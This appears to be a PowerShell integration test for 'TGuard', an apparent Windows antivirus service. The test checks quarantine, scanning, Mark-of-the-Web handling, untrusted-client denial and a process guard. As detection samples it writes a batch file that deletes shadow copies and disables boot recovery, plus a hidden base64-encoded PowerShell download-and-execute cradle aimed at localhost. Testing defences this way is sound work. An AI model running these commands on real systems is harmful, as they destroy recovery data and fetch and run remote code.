param([string]$ServiceExe = "publish/service/TGuard.Service.exe")

$ErrorActionPreference = 'Stop'

function Send-TGuard([string]$cmd, $arguments = $null) {
    $pipe = New-Object System.IO.Pipes.NamedPipeClientStream('.', 'TGuard.Service.v1', [System.IO.Pipes.PipeDirection]::InOut)
    $pipe.Connect(5000)
    $w = New-Object System.IO.StreamWriter($pipe); $w.AutoFlush = $true
    $r = New-Object System.IO.StreamReader($pipe)
    $req = @{ cmd = $cmd }
    if ($arguments) { $req.args = $arguments }
    $w.WriteLine(($req | ConvertTo-Json -Compress -Depth 5))
    $line = $r.ReadLine()
    $pipe.Dispose()
    return $line | ConvertFrom-Json
}

$proc = Start-Process -FilePath $ServiceExe -PassThru -NoNewWindow
try {
    $ok = $false
    for ($i = 0; $i -lt 30 -and -not $ok; $i++) {
        Start-Sleep -Seconds 1
        try { $s = Send-TGuard 'status'; $ok = $s.ok } catch { }
    }
    if (-not $ok) { throw 'Service did not answer the status request.' }
    Write-Host "Status: $($s.data | ConvertTo-Json -Compress)"
    if (-not $s.data.realtimeEnabled -or $s.data.watchedFolders -lt 1) { throw 'Real-time protection is not active.' }

    $downloads = Join-Path $env:USERPROFILE 'Downloads'
    New-Item -ItemType Directory -Force -Path $downloads | Out-Null
    $file = Join-Path $downloads 'tguard_test_cleanup.cmd'
    $bad = '@echo off' + "`r`n" + 'vssadmin' + ' delete shadows /all /quiet' + "`r`n" + 'bcdedit /set {default}' + ' recoveryenabled no'
    Set-Content -Path $file -Value $bad -Encoding ascii

    $caught = $false
    for ($i = 0; $i -lt 20 -and -not $caught; $i++) {
        Start-Sleep -Seconds 1
        $caught = -not (Test-Path $file)
    }
    if (-not $caught) { throw 'Real-time protection did not quarantine the test file.' }

    $q = Send-TGuard 'quarantine.list'
    if (-not ($q.data | Where-Object { $_.originalPath -like '*tguard_test_cleanup.cmd' })) { throw 'Test file is not in quarantine.' }
    $ev = Send-TGuard 'events'
    Write-Host "Events: $(@($ev.data).Count)"

    $deny = Send-TGuard 'settings.set' @{ realtimeEnabled = $false }
    if ($deny.ok) { throw 'SECURITY FAILURE: settings change accepted from an untrusted client.' }
    Write-Host "Untrusted request rejected: $($deny.error)"
    $st2 = Send-TGuard 'status'
    if (-not $st2.data.realtimeEnabled) { throw 'Real-time protection was turned off by an untrusted client.' }
    $deny2 = Send-TGuard 'quarantine.delete' @{ id = 'x' }
    if ($deny2.ok) { throw 'SECURITY FAILURE: quarantine.delete accepted from an untrusted client.' }

    $js = Join-Path $downloads 'tguard_test_invoice.js'
    Set-Content -Path $js -Value 'var x = 1;' -Encoding ascii
    Set-Content -Path "$($js):Zone.Identifier" -Value "[ZoneTransfer]`r`nZoneId=3`r`nHostUrl=http://185.22.1.9/cgd/fatura.js" -Encoding ascii
    $found = $false
    for ($i = 0; $i -lt 20 -and -not $found; $i++) {
        Start-Sleep -Seconds 1
        $ev = Send-TGuard 'events'
        $found = [bool](@($ev.data) | Where-Object { $_.target -like '*tguard_test_invoice.js' })
    }
    if (-not $found) { throw 'Download origin (Mark-of-the-Web) was ignored.' }
    $e = @($ev.data) | Where-Object { $_.target -like '*tguard_test_invoice.js' } | Select-Object -First 1
    Write-Host "MOTW: $($e.verdict) $($e.score) - $($e.reasons -join ' | ')"

    $scanDir = Join-Path $env:TEMP 'tguard-scan-test'
    New-Item -ItemType Directory -Force -Path $scanDir | Out-Null
    Set-Content -Path (Join-Path $scanDir 'ok.txt') -Value 'nothing to see here' -Encoding ascii
    Set-Content -Path (Join-Path $scanDir 'bad.cmd') -Value $bad -Encoding ascii
    $start = Send-TGuard 'scan.start' @{ type = 'custom'; paths = @($scanDir) }
    if (-not $start.ok) { throw "scan.start failed: $($start.error)" }
    $done = $null
    for ($i = 0; $i -lt 30 -and -not $done; $i++) {
        Start-Sleep -Seconds 1
        $p = Send-TGuard 'scan.progress'
        if (-not $p.data.running) { $done = $p.data }
    }
    if (-not $done) { throw 'Custom scan did not finish.' }
    Write-Host "Scan: $($done.filesScanned) files, $($done.threats) threat(s)"
    if ($done.filesScanned -lt 2 -or $done.threats -lt 1) { throw 'Custom scan missed the test threat.' }
    $st3 = Send-TGuard 'status'
    if (-not $st3.data.lastScan) { throw 'Last scan date was not saved.' }

    if (-not $st3.data.processGuardActive) { throw 'Process guard is not active.' }
    $payload = 'Start-Sleep -Seconds 25; IEX (New-Object Net.WebClient).DownloadString(''http://127.0.0.1:9/a.ps1'')'
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
    $ps = Start-Process -FilePath powershell.exe -ArgumentList @('-NoProfile', '-WindowStyle', 'Hidden', '-EncodedCommand', $b64) -PassThru
    $killed = $false
    for ($i = 0; $i -lt 15 -and -not $killed; $i++) {
        Start-Sleep -Seconds 1
        $killed = $ps.HasExited
    }
    if (-not $killed) { Stop-Process -Id $ps.Id -Force; throw 'Process guard did not terminate the malicious PowerShell.' }
    $ev = Send-TGuard 'events'
    $pe = @($ev.data) | Where-Object { $_.source -eq 'process' } | Select-Object -First 1
    if (-not $pe) { throw 'No process event was recorded.' }
    Write-Host "Process guard: $($pe.headline) - $($pe.action)"

    $ok = Start-Process -FilePath powershell.exe -ArgumentList @('-NoProfile', '-Command', 'Start-Sleep -Seconds 6') -PassThru
    Start-Sleep -Seconds 3
    if ($ok.HasExited) { throw 'Process guard killed a harmless PowerShell (false positive).' }
    Write-Host 'Service OK.' -ForegroundColor Green
}
finally {
    Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
}
